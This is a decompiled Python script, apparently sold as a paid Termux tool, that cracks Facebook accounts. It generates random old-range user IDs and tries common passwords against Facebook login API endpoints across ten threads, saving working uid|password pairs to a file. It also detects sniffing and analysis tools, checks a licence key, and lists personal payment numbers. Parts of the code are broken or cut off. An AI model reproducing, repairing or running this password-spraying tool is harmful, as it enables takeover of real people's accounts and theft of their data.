# -*- coding: utf-8 -*-
# Decompiled from Python 3.12 bytecode

import os
import re
import time
import uuid
import platform
from datetime import datetime
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime, timedelta
user_key = None
exp = None
left = None
# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()

# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()

try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass


class sec:
    """
    A security class to detect debugging and packet sniffing tools.
    """
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        # Paths to check for modifications
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        # Check for HTTPCanary (a packet sniffing app)
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        """
        Terminates the script if tampering is detected.
        """
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print('\x1b[1;96m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m')


# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

# Color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'


def windows():
    """
    Generates a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])


def window1():
    """
    Generates another variant of a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])


# Set window title
sys.stdout.write('\x1b]2;🩷【SHANI~MALIK】♥️\x07')

# ================= BOOT SCREEN =================

def boot_screen():

    import os, sys, time

    # ===== COLORS =====

    C = '\033[1;96m'
    G = '\033[1;92m'
    Y = '\033[1;93m'
    W = '\033[1;97m'
    GRAY = '\033[1;90m'
    X = '\033[0m'

    # ===== CLEAR FIRST =====

    os.system('clear')

    # ===== SPEEDS =====

    delay_1 = 0.05
    delay_2 = 0.04
    delay_3 = 0.02
    delay_4 = 0.02
    delay_5 = 0.03

    # ===== BOOT LINES =====

    boot_lines = [

        ("┌", "Assalam O Alaikum", G, delay_1),

        ("├", "SYSTEM BOOT", W, delay_2),

        ("├", "Initializing Security Protocols...", GRAY, delay_3),

        ("├", "Loading Modules...", Y, delay_4),

        ("└", "System Ready ✓", G, delay_5)

    ]

    # ===== ANIMATION =====

    for symbol, text, color, delay in boot_lines:

        sys.stdout.write(C + f"{symbol}─[" + X + " ")
        sys.stdout.flush()

        for char in text:

            sys.stdout.write(color + char + X)
            sys.stdout.flush()

            time.sleep(delay)

        sys.stdout.write(C + " ]" + X + "\n")
        sys.stdout.flush()

        time.sleep(0.15)

    # ===== DIRECT NEW PAGE =====

    time.sleep(0.1)

    os.system('clear')
    
# ================= MAIN BANNER =================
import sys
def menu_clear():
    # Banner + Main menu ko chor kar baqi clear karega
    sys.stdout.write("\033[20;0H")
    sys.stdout.write("\033[J")
    sys.stdout.flush()
def ____banner____():

    # ===== COLORS =====

    R = '\033[1;91m'
    G = '\033[1;92m'
    Y = '\033[1;93m'
    B = '\033[1;94m'
    P = '\033[1;95m'
    C = '\033[1;96m'
    W = '\033[1;97m'
    X = '\033[0m'

    global user_key, exp, left

    # ================= SAFE VALUES =================

    try:
        if not user_key:
            user_key = "LOADING..."
    except:
        user_key = "LOADING..."

    try:
        if not exp:
            exp = "N/A"
    except:
        exp = "N/A"

    try:
        if not left:
            left = "N/A"
    except:
        left = "N/A"

    # ================= TOP PANEL =================

    print(C + "┌─────────────────────── S H A N I ───────────────────────┐" + X)

    # ================= LOGO =================

    logo = [

        "███████╗██╗  ██╗ █████╗ ███╗   ██╗██╗",
        "██╔════╝██║  ██║██╔══██╗████╗  ██║██║",
        "███████╗███████║███████║██╔██╗ ██║██║",
        "╚════██║██╔══██║██╔══██║██║╚██╗██║██║",
        "███████║██║  ██║██║  ██║██║ ╚████║██║",
        "╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝"

    ]

    for line in logo:

        print(
            C + "│ " +
            G + line.center(55) +
            C + " │" + X
        )

    # ================= LAST LINE =================

    print(C + "├─────────────────────────────────────────────────────────┤" + X)
    
    # ================= DETAILS =================
    
    print(
    C + "│ " +
    G + "◈" + W + " OWNER       " +
    C + ":" +
    W + " SHANI MALIK".ljust(41) +
    C + "│"
)
    
    print(
    C + "│ " +
    G + "◈" + W + " WHATSAPP    " +
    C + ":" +
    G + " +923200795589".ljust(41) +
    C + "│"
)
    
    print(
    C + "│ " +
    G + "◈" + W + " TOOL TYPE   " +
    C + ":" +
    Y + " PREMIUM PAID TOOL".ljust(41) +
    C + "│"
)
    
    print(
    C + "│ " +
    G + "◈" + W + " DEVICE KEY  " +
    C + ":" +
    P + f" {user_key}".ljust(41) +
    C + "│"
)
    
    print(
    C + "│ " +
    G + "◈" + W + " EXPIRY DATE " +
    C + ":" +
    G + f" {exp}".ljust(41) +
    C + "│"
)
    
    print(
    C + "│ " +
    G + "◈" + W + " TIME LEFT   " +
    C + ":" +
    R + f" {left}".ljust(41) +
    C + "│"
)
    
    print(C + "├─────────────────────────────────────────────────────────┤" + X)
    
    print(
    C + "│ " +
    Y + "⚡ SHORTCUTS : " +
    W + "CTRL+C " +
    G + "(Pause)" +
    W + " | CTRL+Z " +
    R + "(Stop)" +
    " " * 11 +
    C + "│"
)
    
    print(C + "└─────────────────────────────────────────────────────────┘" + X)
    
# ================= SHANI SETUP =================
    print(C + "┌──────────────────── SHANI - SETUP ──────────────────────┐" + X)
    print(C + "├─────────────────────────────────────────────────────────┤" + X)

def creationyear(uid):
    """
    Estimates the Facebook account creation year based on the UID.
    """
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000004', '1000004', '1000004', '1000004', '1000004', '1000004')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100004'):
            return '2010'
        if uid.startswith(('100004', '100004')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''
def clear():
    os.system('clear')
def linex():
    print('\x1b[1;96m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m')

def BNG_71_():

    ____banner____()
    
    while True:

        # OLD CLONE OPTION
        print(C + "│ " + G + "<1>" + W + " OLD CLONE".ljust(53) + C + "│")
        print(C + "└─────────────────────────────────────────────────────────┘" + X)

        __Jihad__ = input(
            f"\n{R}➤{W} CHOICE {C}:{Y} "
            f"{G}➤➤ {X}"
        )

        # OLD CLONE
        if __Jihad__ in ('1', '01', 'a'):

            # KEY NOT APPROVED / EXPIRED
            if status != "approved":

                access_denied_block(
                    user_key,
                    status,
                    exp
                )

                payment_box()

                break

            # KEY APPROVED
            else:

                old_clone()

                break

        # INVALID OPTION
        else:

            print(f"\n{R}⚠ INVALID OPTION{X}")

            time.sleep(1)

            continue

def old_clone():

    menu_clear()

    print("\x1b[38;5;201m┌──────────────── OLD ACCOUNT CRACKER ────────────────┐\x1b[0m")
    print("\x1b[38;5;201m│ \x1b[1;96m[1]\x1b[1;32m CRACK ALL ACCOUNTS".ljust(56) + "\x1b[38;5;201m│\x1b[0m")
    print("\x1b[38;5;201m│ \x1b[1;96m[2]\x1b[1;32m 100004 / 100004".ljust(56) + "\x1b[38;5;201m│\x1b[0m")
    print("\x1b[38;5;201m│ \x1b[1;96m[3]\x1b[1;32m CRACK 2009-2013".ljust(56) + "\x1b[38;5;201m│\x1b[0m")
    print("\x1b[38;5;201m│ \x1b[1;96m[0]\x1b[1;31m BACK TO MAIN MENU".ljust(56) + "\x1b[38;5;201m│\x1b[0m")
    print("\x1b[38;5;201m└─────────────────────────────────────────────────────┘\x1b[0m")
    _input = choice = input(f"\x1b[38;5;196m➤\x1b[1;37m CHOICE {W}:{Y} \x1b[38;5;46m➤➤\x1b[0m ")
    if _input in ('1', 'a', '01', '1'):
        menu_clear()
        old_One()
    elif _input in ('2', 'b', '02', '2'):
        menu_clear()
        old_Tow()
    elif _input in ('3', 'c', '03', '3'):
        menu_clear()
        old_Tree()
    else:
        print(f"\n[×]{rad} Choose Value Option... ")
        time.sleep(1)
        old_clone()
    
def old_One():
    menu_clear()
    """
    Cloning method for accounts from 2010-2014.
    """
    user = []
    print("\x1b[38;5;51m┌──────────────── SELECT SERIES ────────────────┐\x1b[0m")
    print("\x1b[38;5;51m│ [1] 100000".ljust(56) + "│\x1b[0m")
    print("\x1b[38;5;51m│ [2] 100001".ljust(56) + "│\x1b[0m")
    print("\x1b[38;5;51m│ [3] 100002".ljust(56) + "│\x1b[0m")
    print("\x1b[38;5;51m│ [4] 100003".ljust(56) + "│\x1b[0m")
    print("\x1b[38;5;51m│ [5] 100004".ljust(56) + "│\x1b[0m")
    print("\x1b[38;5;51m└───────────────────────────────────────────────┘\x1b[0m")
    print("\x1b[38;5;51m│ SELECT YOUR SERIES OPTION".ljust(56) + "│\x1b[0m")
    print("\x1b[38;5;51m└───────────────────────────────────────────────┘\x1b[0m")
    ask = choice = input(f"\x1b[38;5;196m➤\x1b[1;37m CHOICE {W}:{Y} \x1b[38;5;46m➤➤\x1b[0m ")
    # SELECT SERIES BLOCK CLEAR
sys.stdout.write("\033[20;0H")
sys.stdout.write("\033[J")
sys.stdout.flush()

linex()
    print("\x1b[38;5;226m┌───────────────── LIMIT MENU ─────────────────┐\x1b[0m")
    print("\x1b[38;5;226m│ EXAMPLE : 20000 • 30000 • 99999".ljust(56) + "│\x1b[0m")
    print("\x1b[38;5;226m└──────────────────────────────────────────────┘\x1b[0m")
    limit = choice = input(f"\x1b[38;5;196m────────────────────────────────➤ \x1b[1;37m(★)\x1b[38;5;196m>× \x1b[38;5;46mCHOICE {W} : {Y} \x1b[38;5;196m➤\x1b[0m ")
    menu_clear()
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print("\x1b[38;5;46m┌───────────────── SELECT METHOD ───────────────┐\x1b[0m")
    print("\x1b[38;5;46m│ [1] METHOD 1".ljust(56) + "│\x1b[0m")
    print("\x1b[38;5;46m│ [2] METHOD 2".ljust(56) + "│\x1b[0m")
    print("\x1b[38;5;46m└──────────────────────────────────────────────┘\x1b[0m")
    linex()
    meth = choice = choice = input(f"\x1b[38;5;196m➤\x1b[1;37m CHOICE {W}:{Y} \x1b[38;5;46m➤➤\x1b[0m ")
    menu_clear()
    with tred(max_workers=10) as pool:
        print(f"\x1b[1;96m[★]➤ TOTAL IDS CRACK : \x1b[1;32m{limit:<10}\x1b[0m")
        print(f"\x1b[1;96m[★]➤ SELECTED        : \x1b[1;32mM1\x1b[0m")
        print(f"\x1b[1;96m[★]➤ USE VPN         : \x1b[1;32m1.1.1.1\x1b[0m / \x1b[1;31mPROTON\x1b[0m")
        linex()
        for mal in user:
            uid = star + mal
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVshaniD METHOD SELECTED")
                break

def old_Tow():
    menu_clear()
    """
    Cloning method for accounts with specific prefixes.
    """
    user = []
    print("\x1b[38;5;51m┌──────────────── SELECT SERIES ────────────────┐\x1b[0m")
    print("\x1b[38;5;51m│ [1] 100000".ljust(56) + "│\x1b[0m")
    print("\x1b[38;5;51m│ [2] 100001".ljust(56) + "│\x1b[0m")
    print("\x1b[38;5;51m│ [3] 100002".ljust(56) + "│\x1b[0m")
    print("\x1b[38;5;51m│ [4] 100003".ljust(56) + "│\x1b[0m")
    print("\x1b[38;5;51m│ [5] 100004".ljust(56) + "│\x1b[0m")
    print("\x1b[38;5;51m└───────────────────────────────────────────────┘\x1b[0m")
    print("\x1b[1;95m╔══════════════════════════════════╗\x1b[0m")
    print("\x1b[1;93m║  ★ PREMIUM TOOL INTERFACE ★      ║\x1b[0m")
    print("\x1b[1;95m╚══════════════════════════════════╝\x1b[0m\n")
    ask = choice = input(f"\x1b[38;5;196m[SELECT]\x1b[38;5;46m {Y}:{G} \x1b[38;5;196m➤\x1b[0m ")
    linex()
    print(f"\x1b[38;5;51m╭─[★]─➤ EXAMPLE {Y}:{G} 20000 • 30000 • 99999\x1b[0m")
    print(f"\x1b[38;5;51m╰───────────────────────────────\x1b[0m")
    limit =  choice = input(f"\x1b[38;5;196m[SELECT]\x1b[38;5;46m {Y}:{G} \x1b[38;5;196m➤\x1b[0m ")
    linex()
    prefixes = ['100004', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print("\x1b[38;5;51m┌── [ 1 ] ─────────────────────┐\x1b[0m")
    print("\x1b[38;5;51m│ METHOD 1                     │\x1b[0m")
    print("\x1b[38;5;51m└──────────────────────────────┘\x1b[0m")

    print("\x1b[38;5;51m┌── [ 2 ] ─────────────────────┐\x1b[0m")
    print("\x1b[38;5;51m│ METHOD 2                     │\x1b[0m")
    print("\x1b[38;5;51m└──────────────────────────────┘\x1b[0m")
    linex()
    meth = choice = input(f"\x1b[38;5;196m➤ \x1b[1;37mCHOICE {W}:{Y} \x1b[38;5;46m➤\x1b[0m ")
    with tred(max_workers=10) as pool:
        print(f"\x1b[1;96m[★]➤ TOTAL IDS CRACK : \x1b[1;32m{limit:<10}\x1b[0m")
        print(f"\x1b[1;96m[★]➤ SELECTED        : \x1b[1;32mM1\x1b[0m")
        print(f"\x1b[1;96m[★]➤ USE VPN         : \x1b[1;32m1.1.1.1\x1b[0m / \x1b[1;31mPROTON\x1b[0m")
        linex()
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVshaniD METHOD SELECTED")
                break

def old_Tree():
    menu_clear()
    """
    Cloning method for accounts from 2009-2013.
    """
    user = []
    print(f"\x1b[38;5;196m➤ \x1b[1;37mOLD CODE\x1b[0m \x1b[38;5;46m{Y}:{G}\x1b[0m \x1b[38;5;244m2009-2013\x1b[0m")
    ask = input(f"\x1b[38;5;196m➤\x1b[1;37m SELECT \x1b[0m\x1b[38;5;46m{Y}:{G}\x1b[0m ")
    linex()
    print(f"\x1b[38;5;196m╭─[\x1b[1;37m★\x1b[38;5;196m]─➤\x1b[38;5;46m EXAMPLE {Y}:{G} \x1b[38;5;226m20000 \x1b[1;37m•\x1b[38;5;226m 30000 \x1b[1;37m•\x1b[38;5;226m 99999\x1b[0m")
    print(f"\x1b[38;5;196m╰───────────────────────────────\x1b[0m")
    limit = input(f"\x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print("\x1b[38;5;82m┌── [ 1 ] ─────────────────────┐\x1b[0m")
    print("\x1b[38;5;82m│ METHOD 1                     │\x1b[0m")
    print("\x1b[38;5;82m└──────────────────────────────┘\x1b[0m")

    print("\x1b[38;5;196m┌── [ 2 ] ─────────────────────┐\x1b[0m")
    print("\x1b[38;5;196m│ METHOD 2                     │\x1b[0m")
    print("\x1b[38;5;196m└──────────────────────────────┘\x1b[0m")
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(1/2): {Y}").strip().upper()
    with tred(max_workers=10) as pool:
        print(f"\x1b[1;96m[★]➤TOTAL IDS CRACK : \x1b[1;32m{limit}\x1b[0m")
        print(f"\x1b[1;96m✈ FLIGHT MODE \x1b[1;37m➤ \x1b[1;32mON\x1b[0m / \x1b[1;31mOFF{G}\x1b[0m")
        print(f"\x1b[1;32m[★]➤SELECTED:M1{G}\x1b[0m")
        linex()
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVD METHOD SELECTED")
                break


def login_1(uid):
    """
    Login attempt method 1.
    """
    global loop
    session = requests.session()
    try:
        import sys
        sys.stdout.write(f"\r\r\x1b[38;5;46m[shani]\x1b[0m\x1b[38;5;196m({loop})\x1b[0m\x1b[38;5;46m(OK)\x1b[0m\x1b[38;5;46m({len(oks)})\x1b[0m")
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\033[1;31m[\033[30mshani\033[1;31m] \033[1;36m\033[1;32m{uid} \033[1;37m\033[30m{pw}\033[0m")
                open('/sdcard/shani-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\033[1;31m[\033[30mshani\033[1;31m] \033[1;36m\033[1;32m{uid} \033[1;37m\033[30m{pw}\033[0m")
                open('/sdcard/shani-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)


def login_2(uid):
    """
    Login attempt method 2.
    """
    sys.stdout.write(f"\r\r\x1b[1;37m>\x1b[38;5;196m+\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mshani-M2\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-qushanity': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in po:
                    print(f"\r\033[1;31m[\033[30mshani\033[1;31m] \033[1;36m\033[1;32m{uid} \033[1;37m\033[30m{pw}\033[0m")
                    open('/sdcard/shani-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
                elif 'session_key' in po:
                    print(f"\r\033[1;31m[\033[30mshani\033[1;31m] \033[1;36m\033[1;32m{uid} \033[1;37m\033[30m{pw}\033[0m")
                    open('/sdcard/shani-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(10)
        except Exception as e:
                pass
import requests
import sys

import requests
import os
import time
import sys

# ANSI Color Codes
G = '\033[1;92m' # Green
W = '\033[1;37m' # White
R = '\033[1;91m' # Red
Y = '\033[1;93m' # Yellow
B = '\033[1;94m' # Blue
P = '\033[1;95m' # Purple
C = '\033[1;96m' # Cyan
import os, time, requests

# ─────────────────────────────
# 🎨 COLORS (ASIM STYLE)
# ─────────────────────────────
G = "\033[1;92m"
C = "\033[1;96m"
R = "\033[1;91m"
Y = "\033[1;93m"
P = "\033[1;95m"
W = "\033[0m"

# ─────────────────────────────
# 🔑 SHANI PREMIUM KEY SYSTEM
# ─────────────────────────────

import os
import hashlib
import platform
import requests
import sys
import base64

from datetime import datetime

# ================= API URL =================

APPROVED_URL = "https://api.github.com/repos/S-OLD/S/contents/keys.txt"

# ================= DEVICE KEY =================

def get_android_id():

    try:

        android_id = os.popen(
            "settings get secure android_id"
        ).read().strip()

        if android_id and android_id != "null":
            return android_id

    except:
        pass

    return "ANDROID"


def get_device_key():

    android_id = get_android_id()

    base = (
        android_id +
        platform.machine() +
        platform.system()
    )

    hash_val = hashlib.sha256(
        base.encode()
    ).hexdigest().upper()

    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

    key = ""

    # SHORT UNIQUE KEY
    for i in range(6):

        part = hash_val[i*4:(i*4)+4]

        index = int(part, 16) % len(chars)

        key += chars[index]

    return f"S-{key}"


# ================= CHECK KEY =================

def check_key(key):

    try:

        headers = {

            "Cache-Control": "no-cache"

        }

        response = requests.get(
            APPROVED_URL,
            headers=headers,
            timeout=10
        )

        data = response.json()

        content = base64.b64decode(
            data["content"]
        ).decode()

        lines = content.splitlines()

        now = datetime.now()

        for line in lines:

            if "|" not in line:
                continue

            saved_key, exp_date = line.split("|")

            saved_key = saved_key.strip()

            exp_date = exp_date.strip()

            if saved_key == key:

                try:

                    exp = datetime.strptime(
                        exp_date,
                        "%d-%m-%Y %I:%M %p"
                    )

                except:

                    return "not", None, None

                if now <= exp:

                    remaining = exp - now

                    days = remaining.days

                    hours = (
                        remaining.seconds // 3600
                    )

                    minutes = (
                        remaining.seconds % 3600
                    ) // 60

                    left = (
                        f"{days}D "
                        f"{hours}H "
                        f"{minutes}M"
                    )

                    return (
                        "approved",
                        exp_date,
                        left
                    )

                else:

                    return (
                        "expired",
                        exp_date,
                        "0D 0H 0M"
                    )

        return "not", None, None

    except Exception as e:

        print(e)

        return "not", None, None

# ================= ACCESS DENIED =================

def access_denied_block(key, status, exp=None):

    R = '\033[1;91m'
    G = '\033[1;92m'
    Y = '\033[1;93m'
    C = '\033[1;96m'
    W = '\033[1;97m'
    P = '\033[1;95m'
    X = '\033[0m'

    print()

    # ================= ERROR BOX =================

    print(R + "┌──────────────── ACCESS DENIED ────────────────┐" + X)

    if status == "expired":

        print(R + "│" + W + " YOUR KEY IS EXPIRED ".center(48) + R + "│")

    else:

        print(R + "│" + W + " YOUR KEY IS NOT APPROVED ".center(47) + R + "│")

    print(R + "└───────────────────────────────────────────────┘" + X)

    # ================= KEY BOX =================

    print(C + "┌───────────────── YOUR KEY ────────────────────┐" + X)

    print(C + "│" + W + " COPY THIS KEY AND SEND TO ADMIN ".center(47) + C + "│")

    print(C + "├───────────────────────────────────────────────┤" + X)

    print(C + "│ " + Y + f"{key}".center(46) + C + "│")

    print(C + "└───────────────────────────────────────────────┘" + X)

    print()

    # ================= STATUS =================

    if status == "expired":

        print(R + "➤ STATUS : EXPIRED" + X)

        if exp:
            print(Y + f"➤ EXPIRY : {exp}" + X)

    else:

        print(R + "➤ STATUS : NOT APPROVED" + X)

    print()

    # ================= PAYMENT BOX =================

    print(G + "┌────────────── PAYMENT METHODS ────────────────┐" + X)

    print(G + "│ " + W + "ACCOUNT NAME : " + Y + "MUHAMMAD SAFDAR".ljust(31) + G + "│")

    print(G + "├───────────────────────────────────────────────┤" + X)

    print(G + "│ " + W + "EASYPAISA : " + C + "03060725589".ljust(34) + G + "│")

    print(G + "│ " + W + "JAZZCASH  : " + C + "03060725589".ljust(34) + G + "│")

